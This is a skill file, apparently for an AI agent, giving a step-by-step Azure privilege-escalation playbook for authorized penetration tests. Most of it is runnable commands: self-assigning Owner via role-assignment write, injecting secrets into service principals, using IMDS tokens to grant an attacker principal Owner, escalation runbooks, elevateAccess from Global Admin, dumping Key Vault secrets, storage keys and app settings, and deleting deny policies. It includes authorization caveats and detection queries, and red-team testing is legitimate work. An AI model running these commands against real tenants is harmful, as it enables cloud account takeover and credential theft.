---
name: performing-azure-privilege-escalation
description: >-
  Discover and validate Azure privilege-escalation paths across RBAC, service
  principals, managed identities, automation accounts, and Entra ID roles, with a
  confirm-gated RBAC escalation attempt. Mapped to MITRE ATT&CK Cloud.
domain: cybersecurity
subdomain: cloud-security
tags:
  - azure
  - privilege-escalation
  - rbac
  - entra-id
  - service-principal
  - managed-identity
  - automation-account
  - imds
  - global-admin
  - role-assignment
  - credential-injection
  - cloud-pentest
  - red-team
  - post-exploitation
  - T1098
  - T1098.001
  - T1098.003
  - T1548
  - T1484.002
  - T1078.004
  - T1552.008
  - T1059.009
  - T1555
version: '1.0'
author: emmanuelokonkwo
license: Apache-2.0
---

# Performing Azure Privilege Escalation

## Metadata
- **Subdomain:** cloud-security
- **Tags:** `azure` `privilege-escalation` `rbac` `entra-id` `service-principal` `managed-identity` `automation-account` `imds` `global-admin` `role-assignment` `credential-injection` `cloud-pentest` `red-team` `post-exploitation`
- **Has Script:** true
- **Script Subcommands:** `check` · `rbac-paths` · `sp-paths` · `identity-paths` · `automation-paths` · `entra-paths` · `attempt-rbac-add` · `report`
- **MITRE ATT&CK:** T1098, T1098.001, T1098.003, T1548, T1484.002, T1078.004, T1552.008, T1059.009
- **Frameworks:** MITRE ATT&CK Cloud · CIS Azure Benchmark v2.0 · Microsoft Security Benchmark v3

---

## Overview

This skill covers privilege escalation against Azure tenants and subscriptions during an authorized penetration test. It maps the paths from an initial foothold — a low-privilege user, a service principal, a compromised VM managed identity, or stolen credentials — to higher privilege levels: subscription Owner, Global Administrator, or access to sensitive credentials.

Azure privilege escalation is fundamentally different from on-premises escalation. Almost every path goes through **Azure RBAC permissions** (what you can do to Azure resources) or **Entra ID roles** (what you can do to the identity directory). Understanding which permissions enable which escalation techniques is the core competency this skill develops.

**Relationship to other skills:**
- Run `performing-azure-offensive-enumeration` first to map the identity and resource landscape
- If a VM is found during enumeration, the IMDS escalation paths here apply directly
- AKS escalation (cluster → Azure) is covered in `performing-aks-cluster-penetration-test`

---

## Authorization Requirements

Privilege escalation testing is **destructive in impact** — an actual successful escalation modifies live role assignments in the tenant. Before running any `attempt-*` subcommand:

1. **Written authorization** must explicitly include: "authorized to attempt privilege escalation"
2. Confirm the scope: which subscriptions, which resource groups, which service principal IDs
3. Confirm a rollback plan: who will remove added role assignments after the test
4. Document the authorization reference in every `attempt-*` command output
5. Run in a **dedicated test account** — never attempt escalation from production service accounts

> **The `check`, `rbac-paths`, `sp-paths`, `identity-paths`, `automation-paths`, and `entra-paths` subcommands are read-only — they enumerate paths without attempting them.**
>
> **`attempt-rbac-add` modifies live Azure RBAC. It requires `--confirm-authorized` and will log the action.**

---

## Prerequisites

```bash
# Azure CLI (required)
az login  # or az login --service-principal / --identity

# Verify current context before starting:
python3 agent.py check
```

---

## Privilege Escalation Path Taxonomy

Azure escalation paths fall into six categories. Each is a distinct mechanism:

```
CATEGORY A — RBAC Write
  Current principal has Microsoft.Authorization/roleAssignments/write
  → Self-assign Owner/Contributor/UAA on any scope within that permission's scope
  → Highest impact, most directly detectable

CATEGORY B — Service Principal Credential Injection
  Current principal owns an app registration, or has Application.ReadWrite.All
  → Add a new client secret to an existing high-privilege service principal
  → Inherit that SP's permissions — bypasses RBAC (SP may have roles your user doesn't)

CATEGORY C — Managed Identity via Compute
  Current principal can execute code on a VM/container with a high-privilege managed identity
  → IMDS token acquisition → Azure management API calls as the identity
  → Often the fastest path in cloud environments

CATEGORY D — Automation Account Code Execution
  Current principal can create/modify runbooks in an Automation Account
  → Runbook executes as the RunAs service principal or managed identity
  → If RunAs SP has Contributor → full subscription control

CATEGORY E — Entra ID Role Escalation
  Current principal holds Application Administrator, Cloud App Admin, or Privileged Role Admin
  → Add credentials to high-permission app → grant Global Admin role assignment
  → Tenant-wide identity control

CATEGORY F — Global Admin → Subscription Owner
  Current principal is Global Administrator in Entra ID
  → Elevate to User Access Administrator at root scope via elevateAccess API
  → Can then add self to Owner on any subscription in the tenant
```

---

## Phase 1 — RBAC-Based Privilege Escalation

**MITRE:** T1548 · T1098

The most direct path. If the current principal has `Microsoft.Authorization/roleAssignments/write` (or a parent wildcard like `*/write` or `*`) at any scope, it can grant itself or any other principal a higher role at that same scope.

### 1.1 — Identify roleAssignment write permissions

```bash
# Check current principal's role assignments:
PRINCIPAL=$(az ad signed-in-user show --query id -o tsv 2>/dev/null || \
            az account show --query user.name -o tsv)

az role assignment list --assignee "$PRINCIPAL" --all --output json | python3 -c "
import json, sys, subprocess

ESCALATION_VERBS = [
    'Microsoft.Authorization/roleAssignments/write',
    'Microsoft.Authorization/*/write',
    'Microsoft.Authorization/roleDefinitions/write',
    '*/write',
    '*',
]

for ra in json.load(sys.stdin):
    role_name = ra.get('roleDefinitionName','')
    scope = ra.get('scope','')
    role_id = ra.get('roleDefinitionId','').split('/')[-1]

    # Fetch the role definition to check its actions
    result = subprocess.run(
        ['az', 'role', 'definition', 'list', '--name', role_name, '--output', 'json'],
        capture_output=True, text=True
    )
    if result.returncode == 0:
        defs = json.loads(result.stdout)
        for d in defs:
            for p in d.get('permissions', []):
                for action in p.get('actions', []):
                    if any(v in action for v in ESCALATION_VERBS):
                        print(f'RBAC WRITE: {role_name} @ {scope}')
                        print(f'  Action: {action}')
                        print(f'  Path: Add self to Owner at {scope}')
"
```

### 1.2 — Execute role assignment (authorized testing only)

```bash
# Verify you have authorization before running this
SUBSCRIPTION_ID=$(az account show --query id -o tsv)
YOUR_OBJECT_ID=$(az ad signed-in-user show --query id -o tsv)

# Escalate to Owner at subscription scope:
az role assignment create \
  --role "Owner" \
  --assignee "$YOUR_OBJECT_ID" \
  --scope "/subscriptions/$SUBSCRIPTION_ID"

# Or at resource group scope (lower blast radius):
az role assignment create \
  --role "Owner" \
  --assignee "$YOUR_OBJECT_ID" \
  --scope "/subscriptions/$SUBSCRIPTION_ID/resourceGroups/<target-rg>"

# Cleanup after test:
az role assignment delete \
  --role "Owner" \
  --assignee "$YOUR_OBJECT_ID" \
  --scope "/subscriptions/$SUBSCRIPTION_ID"
```

### 1.3 — User Access Administrator path

UAA at any scope can grant Owner at that scope — even without being Owner themselves.

```bash
# Check for UAA assignments:
az role assignment list --all --output json | python3 -c "
import json, sys
for ra in json.load(sys.stdin):
    if ra.get('roleDefinitionName') in ('User Access Administrator',
                                         'Role Based Access Control Administrator'):
        print(f\"UAA/RBAC-ADMIN: {ra['principalName']} @ {ra['scope']}\")
"
```

### 1.4 — Custom role with hidden authorization write

```bash
# Find custom roles with authorization write that aren't obviously named:
az role definition list --custom-role-only --output json | python3 -c "
import json, sys
AUTH_ACTIONS = ['Microsoft.Authorization', '*/write', '*']
for role in json.load(sys.stdin):
    for p in role.get('permissions', []):
        for action in p.get('actions', []):
            if any(a in action for a in AUTH_ACTIONS):
                print(f'CUSTOM ROLE WITH AUTH WRITE: {role[\"roleName\"]}')
                print(f'  Action: {action}')
                print(f'  Assignees: check who holds this role')
"
```

---

## Phase 2 — Service Principal Credential Injection

**MITRE:** T1098.001 — Account Manipulation: Additional Cloud Credentials

If you own an app registration or have `Application.ReadWrite.All`, you can add a new client secret to any existing high-privilege service principal. The SP's role assignments apply to the new credential immediately.

### 2.1 — Find app registrations you own

```bash
# App registrations where current user is an owner:
MY_ID=$(az ad signed-in-user show --query id -o tsv 2>/dev/null)

az ad app list --all --output json | python3 -c "
import json, sys, subprocess

MY_ID = '$(echo $MY_ID)'

for app in json.load(sys.stdin):
    app_id = app.get('id')
    result = subprocess.run(
        ['az', 'ad', 'app', 'owner', 'list', '--id', app_id, '--output', 'json'],
        capture_output=True, text=True
    )
    if result.returncode == 0:
        owners = json.loads(result.stdout or '[]')
        for owner in owners:
            if owner.get('id') == MY_ID:
                print(f'OWNED APP: {app[\"displayName\"]} (id={app_id})')
"
```

### 2.2 — Check SP role assignments for owned apps

```bash
# For each owned app, get its SP and check what Azure RBAC roles it holds:
APP_ID="<app-id-of-owned-registration>"

SP_OBJECT_ID=$(az ad sp show --id "$APP_ID" --query id -o tsv)

az role assignment list --assignee "$SP_OBJECT_ID" --all --output json | python3 -c "
import json, sys
for ra in json.load(sys.stdin):
    print(f\"{ra['roleDefinitionName']} @ {ra['scope']}\")
"
```

### 2.3 — Add a credential to the owned app SP

```bash
# This gives you a credential that authenticates as the SP:
APP_ID="<target-app-id>"

# Add a new client secret (valid 1 year by default):
az ad app credential reset \
  --id "$APP_ID" \
  --append \
  --years 1

# Output includes: appId, password (new secret), tenant
# Store immediately — shown only once

# Authenticate as the SP:
az login \
  --service-principal \
  --username "$APP_ID" \
  --password "<new-secret>" \
  --tenant "<tenant-id>"
```

### 2.4 — Application.ReadWrite.All path (tenant-wide)

If an app registration you can authenticate as holds `Application.ReadWrite.All`, you can add credentials to **any** app in the tenant.

```bash
# Check if current context (SP or user) has Application.ReadWrite.All via any app:
# This requires checking Graph API app role assignments

APP_WITH_RW_ALL="<app-id>"

# Add credential to a target high-privilege app:
TARGET_APP="<target-high-privilege-app-id>"
az ad app credential reset --id "$TARGET_APP" --append
```

---

## Phase 3 — Managed Identity Abuse via Compute

**MITRE:** T1552.008 · T1078.004

If you can execute code on an Azure VM, container, or Azure Function that has a managed identity with elevated permissions, you can retrieve a bearer token from IMDS and act as that identity — no credentials required.

### 3.1 — Identify compute with high-privilege managed identities

```bash
# VMs with system-assigned managed identity:
az vm list --output json | python3 -c "
import json, sys
for vm in json.load(sys.stdin):
    mi = vm.get('identity', {})
    if mi.get('type') in ('SystemAssigned', 'UserAssigned', 'SystemAssigned, UserAssigned'):
        print(f\"{vm['name']} ({vm['resourceGroup']}) — identity type: {mi['type']}\")
        if mi.get('principalId'):
            print(f'  Principal ID: {mi[\"principalId\"]}')
            print(f'  Check roles: az role assignment list --assignee {mi[\"principalId\"]} --all')
"
```

### 3.2 — Check what roles the managed identity holds

```bash
PRINCIPAL_ID="<principal-id-of-managed-identity>"

az role assignment list --assignee "$PRINCIPAL_ID" --all --output json | python3 -c "
import json, sys
HIGH = {'Owner','Contributor','User Access Administrator','Storage Blob Data Owner',
        'Key Vault Administrator','Key Vault Secrets Officer'}
for ra in json.load(sys.stdin):
    role = ra.get('roleDefinitionName','')
    scope = ra.get('scope','')
    marker = '[HIGH]' if role in HIGH else '     '
    print(f'{marker} {role} @ {scope}')
"
```

### 3.3 — Exploit from inside the VM (IMDS token path)

```bash
# Run from inside the target Azure VM (SSH/RDP/exec access):

# Step 1: Get management API token (no auth needed):
TOKEN=$(curl -sf -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | \
  python3 -c "import json,sys; print(json.load(sys.stdin)['access_token'])")

# Step 2: Get instance metadata (subscription and resource group):
METADATA=$(curl -sf -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01")
SUB_ID=$(echo "$METADATA" | python3 -c "import json,sys; print(json.load(sys.stdin)['compute']['subscriptionId'])")

# Step 3: List all resources the identity can reach:
curl -sf -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/${SUB_ID}/resources?api-version=2021-04-01" | \
  python3 -m json.tool

# Step 4: If the identity has Microsoft.Authorization/roleAssignments/write:
MY_OBJECT_ID="<your-attacker-object-id>"
curl -sf -X PUT \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  "https://management.azure.com/subscriptions/${SUB_ID}/providers/Microsoft.Authorization/roleAssignments/$(python3 -c 'import uuid; print(uuid.uuid4())')?api-version=2022-04-01" \
  -d "{
    \"properties\": {
      \"roleDefinitionId\": \"/subscriptions/${SUB_ID}/providers/Microsoft.Authorization/roleDefinitions/8e3af657-a8ff-443c-a75c-2fe8c4bcb635\",
      \"principalId\": \"${MY_OBJECT_ID}\"
    }
  }"
# 8e3af657... is the Owner role definition ID (stable across all Azure tenants)
```

### 3.4 — Azure Container Instance / AKS pod IMDS

```bash
# From inside an AKS pod or ACI container:
# Same IMDS endpoint — works identically if the node has a managed identity
curl -sf -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# AKS node pool managed identity typically has:
# - Contributor on the node resource group
# - Network Contributor on the cluster VNet
# These can be used for network pivoting and node control
```

---

## Phase 4 — Automation Account Code Execution

**MITRE:** T1059.009 — Command and Scripting Interpreter: Cloud API

Azure Automation Accounts execute runbooks as a service principal (RunAs account) or managed identity. If you can create or modify runbooks, you execute code as that identity.

### 4.1 — Identify accessible Automation Accounts

```bash
# List Automation Accounts:
az automation account list --output json | python3 -c "
import json, sys
for aa in json.load(sys.stdin):
    name = aa['name']
    rg = aa['resourceGroup']
    identity = aa.get('identity', {})
    print(f'{name} ({rg})')
    print(f'  Identity type: {identity.get(\"type\",\"none\")}')
    if identity.get('principalId'):
        print(f'  Principal ID: {identity[\"principalId\"]}')
        print(f'  Check roles: az role assignment list --assignee {identity[\"principalId\"]} --all')
"
```

### 4.2 — Check RunAs account permissions

```bash
AA_NAME="<automation-account>"
RG="<resource-group>"

# List connections (RunAs uses a certificate-based connection):
az automation connection list \
  --automation-account-name "$AA_NAME" \
  --resource-group "$RG" \
  --output json | python3 -c "
import json, sys
for conn in json.load(sys.stdin):
    print(f\"{conn['name']} — type: {conn.get('connectionType',{}).get('name','')}\")
    if 'AzureRunAsConnection' in conn.get('name',''):
        print('  [!] AzureRunAsConnection found — check its SP role assignments')
        fields = conn.get('fieldDefinitionValues', {})
        if 'ApplicationId' in fields:
            print(f'  SP App ID: {fields[\"ApplicationId\"]}')
"

# Check the RunAs SP RBAC assignments:
RUN_AS_SP_ID="<application-id-from-above>"
az role assignment list --assignee "$RUN_AS_SP_ID" --all --output json
```

### 4.3 — Create escalation runbook (authorized testing only)

```python
# PowerShell runbook that adds your principal to Owner:
ESCALATION_RUNBOOK = """
# Authenticate using RunAs connection
$conn = Get-AutomationConnection -Name 'AzureRunAsConnection'
Connect-AzAccount -ServicePrincipal `
    -Tenant $conn.TenantID `
    -ApplicationId $conn.ApplicationID `
    -CertificateThumbprint $conn.CertificateThumbprint

# Escalation: grant Owner to attacker principal
$subscriptionId = (Get-AzContext).Subscription.Id
New-AzRoleAssignment `
    -ObjectId "<YOUR-OBJECT-ID>" `
    -RoleDefinitionName "Owner" `
    -Scope "/subscriptions/$subscriptionId"

Write-Output "Escalation complete"
"""
```

```bash
# Create the runbook:
az automation runbook create \
  --automation-account-name "$AA_NAME" \
  --resource-group "$RG" \
  --name "pentest-escalation" \
  --type "PowerShell"

# Upload content:
az automation runbook replace-content \
  --automation-account-name "$AA_NAME" \
  --resource-group "$RG" \
  --name "pentest-escalation" \
  --content "$ESCALATION_RUNBOOK"

# Publish and start:
az automation runbook publish \
  --automation-account-name "$AA_NAME" \
  --resource-group "$RG" \
  --name "pentest-escalation"

az automation runbook start \
  --automation-account-name "$AA_NAME" \
  --resource-group "$RG" \
  --name "pentest-escalation"

# Cleanup:
az automation runbook delete \
  --automation-account-name "$AA_NAME" \
  --resource-group "$RG" \
  --name "pentest-escalation" --yes
```

---

## Phase 5 — Entra ID Role-Based Escalation

**MITRE:** T1098.003 — Account Manipulation: Additional Cloud Roles

Certain Entra ID roles enable escalation by allowing manipulation of high-privilege identities.

### 5.1 — Role escalation matrix

| Held Role | Escalation Path | Result |
|-----------|----------------|--------|
| Application Administrator | Add credentials to any app with high Graph permissions | Tenant-wide API access |
| Cloud App Administrator | Same as App Admin (excluding on-prem apps) | Near-equivalent to App Admin |
| Privileged Role Administrator | Assign any Entra role including Global Admin | Full tenant control |
| Global Administrator | Elevate to User Access Admin via elevateAccess | Owner on all subscriptions |
| Hybrid Identity Administrator | Control Azure AD Connect → potential on-prem sync attack | Cross-environment |
| Authentication Administrator | Reset passwords for non-admin users | Account takeover at scale |
| Password Administrator | Reset passwords for users/helpdesk admins | Wider account takeover |

### 5.2 — Check current Entra ID role memberships

```bash
# Check roles the current user holds:
az rest --method GET \
  --url "https://graph.microsoft.com/v1.0/me/memberOf" \
  --query "value[].{displayName: displayName, type: '@odata.type'}" \
  --output json | python3 -c "
import json, sys
DANGEROUS_ROLES = {
    'Global Administrator', 'Privileged Role Administrator',
    'Application Administrator', 'Cloud App Administrator',
    'Hybrid Identity Administrator', 'Authentication Administrator',
}
for obj in json.load(sys.stdin):
    name = obj.get('displayName','')
    marker = '[ESCALATION PATH]' if name in DANGEROUS_ROLES else '               '
    print(f'{marker} {name}')
"
```

### 5.3 — Application Administrator → credential injection

```bash
# With Application Administrator role, add credentials to any app:
TARGET_APP="<high-privilege-app-id>"  # e.g., an app with Directory.ReadWrite.All

az ad app credential reset \
  --id "$TARGET_APP" \
  --append \
  --display-name "pentest-$(date +%Y%m%d)"

# Use the returned credentials to authenticate as that SP:
# az login --service-principal --username <appId> --password <new-secret> --tenant <tenantId>
```

### 5.4 — Global Admin → Subscription Owner (elevateAccess)

This is the tenant → subscription pivot. A Global Admin can activate the "User Access Administrator" role at the root management scope ("/"), then assign themselves Owner on any subscription.

```bash
# Step 1: Elevate to User Access Administrator at root scope
# (Requires Global Admin in Entra ID)
az rest --method POST \
  --url "https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01"

# Step 2: Verify you now have UAA at root:
az role assignment list \
  --scope "/" \
  --output json | python3 -c "
import json, sys
for ra in json.load(sys.stdin):
    if ra.get('roleDefinitionName') == 'User Access Administrator':
        print(f\"ROOT UAA: {ra['principalName']}\")
"

# Step 3: Assign yourself Owner on the target subscription:
SUBSCRIPTION_ID=$(az account show --query id -o tsv)
YOUR_ID=$(az ad signed-in-user show --query id -o tsv)

az role assignment create \
  --role "Owner" \
  --assignee "$YOUR_ID" \
  --scope "/subscriptions/$SUBSCRIPTION_ID"

# Step 4: Cleanup — remove the root UAA:
az role assignment delete \
  --role "User Access Administrator" \
  --assignee "$YOUR_ID" \
  --scope "/"
```

---

## Phase 6 — Cross-Resource Credential Pivoting

**MITRE:** T1555 · T1552

Even without direct RBAC write, high-value credentials accessible via Key Vault, storage accounts, or App Service configuration can be used for lateral movement.

### 6.1 — Key Vault credential pivot

```bash
KV_NAME="<vault>"

# List accessible secrets:
az keyvault secret list --vault-name "$KV_NAME" --output json | \
  python3 -c "
import json, sys
for s in json.load(sys.stdin):
    print(s['name'])
"

# Retrieve each secret value:
az keyvault secret show --vault-name "$KV_NAME" --name "<secret-name>" --query value -o tsv
```

### 6.2 — Storage account key pivot

```bash
# If you have Microsoft.Storage/storageAccounts/listKeys/action:
az storage account keys list \
  --account-name "<storage-account>" \
  --resource-group "<rg>" \
  --output json

# Use keys to access all blobs:
az storage blob list \
  --account-name "<storage-account>" \
  --account-key "<key>" \
  --container-name "<container>" \
  --output json
```

### 6.3 — App Service application settings

```bash
# Retrieve all app settings (may contain connection strings, keys, tokens):
az webapp config appsettings list \
  --name "<webapp>" \
  --resource-group "<rg>" \
  --output json | python3 -c "
import json, sys, re
SENSITIVE = re.compile(r'password|secret|key|token|connection|credential', re.I)
for s in json.load(sys.stdin):
    if SENSITIVE.search(s.get('name','')):
        print(f\"{s['name']} = {str(s.get('value',''))[:80]}\")
"
```

---

## Phase 7 — Tenant-Level Escalation (Advanced)

### 7.1 — Azure Policy bypass

If you have `Microsoft.Authorization/policyAssignments/write`, you can modify or remove deny policies to enable previously blocked actions.

```bash
# List policy assignments that may be blocking escalation:
az policy assignment list --output json | python3 -c "
import json, sys
for p in json.load(sys.stdin):
    effect = p.get('parameters',{}).get('effect',{}).get('value','')
    if effect == 'Deny':
        print(f\"DENY POLICY: {p['displayName']} ({p['name']})\")
        print(f\"  Scope: {p['scope']}\")
        print(f\"  Remove: az policy assignment delete --name {p['name']}\")
"
```

### 7.2 — Management group inheritance

If a role assignment exists at the management group level, it applies to all child subscriptions.

```bash
# Check for management group role assignments:
az role assignment list --scope "/providers/Microsoft.Management/managementGroups/<mg-id>" \
  --output json 2>/dev/null
```

### 7.3 — Azure Lighthouse delegation

Lighthouse grants a service provider tenant management capabilities in a customer tenant. If Lighthouse delegations exist, the service provider principals may have higher access.

```bash
az managedservices assignment list --output json 2>/dev/null | python3 -c "
import json, sys
for a in json.load(sys.stdin):
    props = a.get('properties',{})
    print(f\"DELEGATION: {props.get('registrationDefinitionId')}\")
    print(f\"  Managed tenant: {props.get('provisioningState')}\")
"
```

---

## Automated Assessment with agent.py

```bash
# Full path analysis (read-only):
python3 agent.py check
python3 agent.py check --output escalation_paths.json

# Targeted analysis:
python3 agent.py rbac-paths
python3 agent.py sp-paths
python3 agent.py identity-paths
python3 agent.py automation-paths
python3 agent.py entra-paths

# Attempt escalation (REQUIRES explicit authorization — use with --confirm-authorized):
python3 agent.py attempt-rbac-add \
  --role Owner \
  --scope /subscriptions/<sub-id> \
  --confirm-authorized "AUTH-REF-12345"

# Report:
python3 agent.py report --findings escalation_paths.json --format md --output escalation_report.md
```

---

## Escalation Path Severity Reference

| Path | CVSS | Prerequisite | Result |
|------|------|-------------|--------|
| `Microsoft.Authorization/roleAssignments/write` at sub scope | 9.9 | Any role with this action | Subscription Owner |
| Global Admin → elevateAccess | 9.9 | Global Admin Entra role | Owner on all subscriptions |
| App Admin → credential injection on Contributor SP | 9.5 | Application Administrator | Subscription Contributor |
| Automation Account runbook creation → Contributor RunAs | 9.0 | `Automation/runbooks/write` + RunAs SP with Contributor | Subscription Contributor |
| VM managed identity with Owner (IMDS) | 9.0 | Code execution on target VM | Subscription Owner |
| Privileged Role Admin → assign Global Admin | 9.5 | Privileged Role Administrator | Full tenant control |
| Storage account list keys | 7.5 | `Microsoft.Storage/storageAccounts/listKeys/action` | All blob data |
| Key Vault Get permission | 7.5 | Key Vault Secrets User | Credentials in vault |

---

## Indicators of Compromise (Defensive)

When performing authorized escalation, generate these audit log events that defenders should detect:

| Action | Azure Activity Log Event | Detection Query (KQL) |
|--------|-------------------------|----------------------|
| roleAssignment create | `Microsoft.Authorization/roleAssignments/write` | `AzureActivity \| where OperationName == "Create role assignment"` |
| App credential add | `Microsoft.DirectoryServices/applications/credentials/update` | `AuditLogs \| where OperationName == "Add service principal credentials"` |
| elevateAccess | `Microsoft.Authorization/elevateAccess/Action` | `AzureActivity \| where OperationName contains "elevateAccess"` |
| Runbook create | `Microsoft.Automation/automationAccounts/runbooks/write` | `AzureActivity \| where ResourceProvider == "Microsoft.Automation"` |
| IMDS token request | Not directly logged (host-level) | Defender for Endpoint process/network telemetry |

---

## References

- [Andy Robbins — Azure Privilege Escalation via Azure API Permissions Abuse](https://posts.specterops.io/azure-privilege-escalation-via-azure-api-permissions-abuse-74aee1006f48)
- [Karl Fosaaen — Attacking Azure Environments with PowerShell](https://www.netspi.com/blog/technical/cloud-penetration-testing/attacking-azure-environments-with-powershell/)
- [Dirk-jan Mollema — Abusing Azure AD SSO](https://dirkjanm.io/)
- [Hacking the Cloud — Azure Privilege Escalation](https://hackingthe.cloud/azure/privilege-escalation/)
- [Microsoft — elevateAccess API](https://learn.microsoft.com/en-us/azure/role-based-access-control/elevate-access-global-admin)
- [AzureHound — BloodHound for Azure](https://github.com/BloodHoundAD/AzureHound)
- [AADInternals](https://aadinternals.com/)
- [MITRE ATT&CK T1098.001 — Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001/)
